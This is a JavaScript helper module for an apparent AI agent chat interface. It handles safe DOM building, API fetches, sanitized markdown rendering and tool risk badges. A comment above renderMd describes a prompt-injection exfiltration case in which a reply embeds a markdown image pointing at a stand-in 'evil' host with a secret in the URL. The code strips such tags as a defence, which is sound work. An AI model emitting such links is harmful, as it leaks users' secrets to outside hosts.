/* Shared DOM + fetch helpers.

   Security invariant (applies to every module): untrusted content (tool args,
   tool results, model output, session titles, memory) reaches the DOM ONLY via
   textContent or sanitized markdown (renderMd = marked → DOMPurify). Never
   assign innerHTML from such content directly. */

export const $ = (sel, root = document) => root.querySelector(sel);

// GFM's del rule fires on single ~ pairs, striking out "~5 ... ~10" prose.
// Require the explicit ~~text~~ form; single tildes render literally.
if (window.marked) {
  marked.use({
    tokenizer: {
      del(src) {
        const m = /^~~(?=[^\s~])([\s\S]*?[^\s~])~~(?=[^~]|$)/.exec(src);
        if (!m) return undefined; // no token → plain text. NEVER `false`: that falls back to GFM's single-tilde del
        return { type: "del", raw: m[0], text: m[1], tokens: this.lexer.inlineTokens(m[1]) };
      },
    },
  });
}

export const api = async (path, opts) => {
  const r = await fetch(path, opts);
  if (!r.ok) {
    let detail = r.statusText;
    try {
      const j = await r.json();
      if (j && j.detail) detail = typeof j.detail === "string" ? j.detail : JSON.stringify(j.detail);
    } catch (_) { /* non-JSON error body */ }
    throw new Error(`${r.status} ${detail}`);
  }
  return r.json();
};

export function esc(s) {
  return String(s ?? "").replace(/[&<>"]/g, (c) =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c])
  );
}

// Small safe-DOM helpers (textContent, never innerHTML).
export function el(tag, cls, text) {
  const e = document.createElement(tag);
  if (cls) e.className = cls;
  if (text != null) e.textContent = text;
  return e;
}

// Assistant prose only — sanitized. Tool args/results NEVER pass through here.
// FORBID the auto-fetching subresource tags: a prompt-injected reply could emit
// `![x](https://evil/?d=<secret>)` and the browser would GET it on render,
// exfiltrating whatever rode the URL. The served CSP (img-src 'self') is the
// browser-enforced backstop; this strips the node at the sanitizer so it never
// reaches the DOM even if the CSP is ever loosened. The chat UI renders no
// images, so nothing legitimate is lost. Keep both halves in lockstep: only the
// CSP half is pinned (test_gateway); this FORBID list has NO pin — re-check by hand.
const _NO_FETCH_TAGS = ["img", "picture", "source", "video", "audio", "svg", "math"];
const _NO_FETCH_ATTR = ["srcset", "poster", "background", "ping"];
export function renderMd(text) {
  if (window.marked && window.DOMPurify) {
    try {
      const html = DOMPurify.sanitize(
        marked.parse(text || "", { breaks: true, gfm: true }),
        { FORBID_TAGS: _NO_FETCH_TAGS, FORBID_ATTR: _NO_FETCH_ATTR },
      );
      // Wide tables scroll via a wrapper div (see .md-table-wrap in chat.css):
      // display:block on the table itself destroys cell alignment. The wrap is
      // the LAST step, over DOMPurify's output only — the inserted markup is a
      // static literal, and marked escapes < inside raw-HTML attribute values
      // while text nodes serialize with < escaped, so a <table …> here is
      // always a real (already-sanitized) element: a code block or a literal
      // "&lt;table&gt;" reaches us escaped, never as this pattern.
      // [^>]* also catches raw-HTML tables that carry attributes; GFM's own
      // tables never do (alignment rides the th/td).
      return html.replace(/<table[^>]*>[\s\S]*?<\/table>/g,
        (m) => `<div class="md-table-wrap">${m}</div>`);
    } catch (_) { /* fall through to plain text */ }
  }
  return esc(text || "");
}

// Screen-reader announcements via the visually-hidden #sr-status live region.
export function announce(msg) { const r = $("#sr-status"); if (r) r.textContent = msg; }

// Shared panel-loader scaffold: fetch a list, clear the container, render one
// card per item (renderCard must build nodes via el/textContent — never
// innerHTML-interpolate model text). Panels with grouping or side effects
// (loadTools, loadApprovals) stay hand-rolled.
export async function loadCards(container, path, renderCard, emptyMsg) {
  const items = await api(path).catch(() => []);
  container.innerHTML = "";
  if (!items.length) { container.appendChild(el("div", "empty", emptyMsg)); return; }
  for (const it of items) container.appendChild(renderCard(it));
  return items;
}

/* ---- risk badges (shared by approvals + tools-security) ---- */
const RISK = {
  READ_ONLY: ["read", "read"],
  MUTATING_LOCAL: ["local change", "local"],
  OUTWARD: ["sends out", "outward"],
  DESTRUCTIVE: ["destructive", "destructive"],
};
export function riskBadge(cls) {
  const [label, klass] = RISK[cls] || ["unknown", "unknown"];
  return `<span class="risk ${klass}">${esc(label)}</span>`;
}
